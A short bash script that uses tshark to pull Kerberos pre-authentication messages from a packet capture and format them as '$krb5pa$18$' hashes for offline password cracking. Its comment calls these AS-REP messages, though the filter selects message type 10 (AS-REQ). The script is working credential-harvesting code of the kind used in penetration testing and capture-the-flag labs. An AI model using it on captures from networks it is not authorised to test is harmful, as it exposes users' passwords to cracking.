#!/usr/bin/env bash

pcap=$1

# Capture the Kerberos AS-REP messages
data_dump=$(tshark -r "$pcap" -Y 'kerberos.msg_type == 10' \
  -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher)

# Process each line
while IFS=$'\t' read -r user domain hash; do
    [[ -z $user || -z $domain || -z $hash ]] && continue
    echo "\$krb5pa\$18\$$user\$$domain\$$hash"
done <<< "$data_dump"


